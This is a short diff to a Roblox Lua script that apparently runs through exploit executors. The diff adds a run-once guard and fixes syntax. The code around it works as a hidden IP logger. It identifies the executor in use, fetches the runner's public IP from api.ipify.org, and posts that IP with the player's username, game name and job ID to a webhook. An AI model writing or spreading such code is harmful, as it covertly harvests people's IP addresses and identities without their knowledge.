@@ -1,4 +1,8 @@
-local webhookcheck =
+local debounce = true
+
+if debounce == true then
+    debounce = false
+    local webhookcheck =
    is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
    secure_load and "Sentinel" or
    KRNL_LOADED and "Krnl" or
@@ -13,7 +17,7 @@ local url =
 local data = {
    ["embeds"] = {
        {
-           ["title"] = "**Someone executed the script! \n \n Their IP:**  "..tostring(game:HttpGet("https://api.ipify.org", true)).."\n\n"
+           ["title"] = "**Someone executed the script! \n \n Their IP:**  "..tostring(game:HttpGet("https://api.ipify.org", true)).."\n\n",
            ["description"] = "Username: " .. game.Players.LocalPlayer.Name.." with **"..webhookcheck.."** ".."\n\n On game: "..game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name.."\n\n Job Id: "..game.JobId,
            ["type"] = "rich",
            ["color"] = tonumber(0x7269da),
@@ -34,3 +38,4 @@ local headers = {
 request = http_request or request or HttpPost or syn.request
 local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
 request(abcdef)
+end
